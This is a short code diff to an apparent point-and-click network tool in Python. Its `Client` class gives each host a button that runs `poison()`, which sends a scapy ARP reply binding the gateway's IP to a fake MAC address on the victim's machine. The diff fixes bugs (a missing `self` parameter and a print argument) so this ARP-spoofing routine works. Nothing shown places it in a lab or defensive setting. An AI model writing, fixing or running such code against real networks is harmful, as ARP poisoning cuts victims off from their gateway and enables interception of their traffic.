@@ -15,7 +15,7 @@ class Client:
 
 		self.parent = parent 
 
-		print(hostname, str(mac))
+		print(hostname, self.mac_addr)
 
 		self.button = CButton(self.parent, x, y, lambda: self.poison(hostname, mac, netifaces.gateways()['default'][netifaces.AF_INET][0]))
 		self.button.set_image(self.graphic)
@@ -31,7 +31,7 @@ class Client:
 	def clear(self):
 		return self.parent.delete(self.text_id)
 	
-	def poison(victim_ip, victim_mac, gateway_ip):
+	def poison(self, victim_ip, victim_mac, gateway_ip):
 		# Send the victim an ARP packet pairing 
 		#the gateway ip with the wrong mac address
 		packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
